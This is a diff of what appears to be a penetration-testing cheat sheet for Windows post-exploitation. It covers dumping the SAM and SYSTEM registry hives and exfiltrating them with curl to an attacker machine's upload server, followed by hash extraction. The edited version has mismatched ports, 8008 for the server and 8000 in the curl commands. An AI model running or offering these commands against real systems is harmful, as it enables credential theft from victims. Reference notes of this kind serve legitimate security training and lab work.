@@ -2493,12 +2493,15 @@ Reference
        `reg save HKLM\SAM sam` `reg save HKLM\SYSTEM system`  
     -  transfer files from victim reverse shell to kali  
        ```
-       mkdir -p /home/kali/upload
-       cd /home/kali/upload
+       #kali
+       mkdir -p /home/kali/uploads
+       cd /home/kali/uploads
        pipx install uploadserver
-       python3 -m uploadserver --directory /home/kali/uploads --port 8000
-       curl -X POST http://192.168.45.221:8000/upload -F "files=@C:\Users\enterpriseuser\sam"
-       curl -X POST http://192.168.45.221:8000/upload -F "files=@C:\Users\enterpriseuser\system"
+       pipx run uploadserver --directory /home/kali/uploads 8008
+
+       #target
+       curl -X POST http://192.168.45.221:8000/uploads -F "files=@C:\Users\enterpriseuser\sam"
+       curl -X POST http://192.168.45.221:8000/uploads -F "files=@C:\Users\enterpriseuser\system"
        ```
     -  Extract the hashes using secretsdump.py  
        ```
